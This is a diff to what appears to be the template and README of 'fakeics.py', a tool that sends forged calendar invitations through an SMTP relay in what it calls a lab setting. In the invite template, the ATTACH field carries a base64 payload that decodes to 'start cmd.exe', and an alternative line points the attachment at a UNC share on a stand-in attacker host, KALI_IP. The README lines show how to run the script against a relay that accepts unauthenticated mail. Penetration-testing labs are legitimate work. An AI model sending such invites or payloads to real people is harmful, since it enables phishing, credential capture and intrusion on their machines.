@@ -153,7 +153,7 @@ DTSTART;TZID=UTC:{DTSTART}
 DTEND;TZID=UTC:{DTEND}
 DTSTAMP:{DTSTAMP}
 ORGANIZER;CN={ORGANIZER_NAME}:mailto:{ORGANIZER_EMAIL}
-ATTACH;FMTTYPE=application/octet-stream;ENCODING=BASE64:\c3RhcnQgY21kLmV4ZQo=
+ATTACH;FMTTYPE=application/octet-stream;ENCODING=BASE64:\c3RhcnQgY21kLmV4ZQo= // or ATTACH;FMTTYPE=application/octet-stream:\\KALI_IP\share
 UID:FIXMEUID{DTSTAMP}
 {ATTENDEES}
 CREATED:{DTSTAMP}
@@ -325,3 +325,6 @@ Run the Script: Execute the Python script with the required arguments:
 python3 fakeics.py <smtp_server_IP> <sender_email> <recipient_email> <event_url>
 ```
 > Note: The script connects to the SMTP server on port 25. Ensure your SMTP relay (e.g., a local Postfix or a mail server in your lab) is configured to accept unauthenticated emails from your Kali machine for this to work in a lab environment.
+
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/55c2a2b9-b16e-4af4-a2bb-4dec0f5d4edf" />
+
